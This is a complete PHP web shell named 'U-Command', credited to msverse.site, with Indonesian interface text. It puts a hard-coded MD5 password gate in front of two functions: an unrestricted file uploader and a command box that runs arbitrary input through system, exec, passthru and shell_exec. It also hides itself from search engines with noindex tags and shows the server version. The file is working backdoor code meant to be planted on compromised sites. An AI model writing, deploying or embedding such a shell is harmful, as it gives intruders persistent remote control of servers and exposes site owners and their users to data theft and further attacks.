<?php
// Author: msverse.site
// Type: Uploader
// Website: https://www.msverse.site/
// Please bre jangan ubah authornya, makasih ,★⌒ヽ(●＾､＾●)Kiss!
session_start();

$auth_pass = "4c3840037fee36c723d0474ab9520e20"; // md5("msverse.site"))

if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    if (isset($_POST['password']) && md5($_POST['password']) == $auth_pass) {
        $_SESSION['logged_in'] = true;
        echo "";
    } else {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="robots" content="noindex"/>
            <meta name="googlebot" content="noindex"/>
            <meta name="googlebot-news" content="nosnippet"/>
            <meta name="robots" content="noarchive"/>
            <meta name="robots" content="nocache"/>
            <meta name="robots" content="noodp"/>
            <meta name="robots" content="nosnippet"/>
            <meta name="yandex" content="noindex, nofollow" />
            <title>U-Command - Login</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    height: 100vh;
                }

                .container {
                    max-width: 400px;
                    padding: 20px;
                    border: 1px solid #ccc;
                    border-radius: 5px;
                }

                h2 {
                    text-align: center;
                    margin-bottom: 20px;
                }

                form {
                    text-align: center;
                }

                label {
                    display: block;
                    margin-bottom: 10px;
                }

                input[type="password"] {
                    width: 100%;
                    padding: 10px;
                    border: 1px solid #ccc;
                    border-radius: 5px;
                }

                input[type="submit"] {
                    margin-top: 10px;
                    padding: 10px 20px;
                    background-color: #4CAF50;
                    color: white;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                }

                input[type="submit"]:hover {
                    background-color: #45a049;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Login Sayang</h2>
                <form method="POST" action="">
                    <label for="password">Password:</label>
                    <input type="password" name="password" id="password" required><br>
                    <input type="submit" value="Login">
                </form>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
}
?>
<?php
$fm = array(
    "server" => function_exists('apache_get_modules') ? apache_get_modules() : get_loaded_extensions(),
    "version" => function_exists('apache_get_version') ? apache_get_version() : PHP_VERSION
);

if (isset($_FILES['uploadedFile'])) {
    $file = $_FILES['uploadedFile']['name'];
    $fileTmp = $_FILES['uploadedFile']['tmp_name'];
    if (move_uploaded_file($fileTmp, $file)) {
        echo 'Upload Berhasil<br />';
    } else {
        echo 'Upload Gagal<br />';
    }
}

if (isset($_POST['cmd'])) {
    $output = '';
    if (function_exists('system')) {
        ob_start();
        system($_POST['cmd']);
        $output = ob_get_contents();
        ob_end_clean();
    }
    if (function_exists('exec')) {
        exec($_POST['cmd'], $output);
        $output = implode("\n", $output);
    }
    if (function_exists('passthru')) {
        ob_start();
        passthru($_POST['cmd']);
        $output = ob_get_contents();
        ob_end_clean();
    }
    if (function_exists('shell_exec')) {
        $output = shell_exec($_POST['cmd']);
    }
}
?>

<!DOCTYPE html>
<html>
<head>
<meta name="author" content="msverse.site">
<meta name="robots" content="noindex"/>
<meta name="googlebot" content="noindex"/>
<meta name="googlebot-news" content="nosnippet"/>
<meta name="robots" content="noarchive"/>
<meta name="robots" content="nocache"/>
<meta name="robots" content="noodp"/>
<meta name="robots" content="nosnippet"/>
<meta name="yandex" content="noindex, nofollow" />
    <title>U-Command</title>
<style>
.footer {
            margin-top: 20px;
            text-align: center;
        }
</style>
</head>
<body>
    <h1>U-Command</h1>
    
    <h2>Upload File:</h2>
    <form enctype="multipart/form-data" method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>">
        <input type="file" name="uploadedFile" required/>
        <input type="submit" value="Upload"/>
    </form>

    <h2>Command:</h2>
    <form method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>">
        <input type="text" name="cmd" placeholder="Command" required/>
        <input type="submit" value="Execute"/>
    </form>
    <?php if (isset($output)) : ?>
        <pre><?php echo $output; ?></pre>
    <?php endif; ?>
    
    <div class="footer">
        <?php echo 'Server: ' . $fm['version']; ?>
    </div>
</body>
</html>
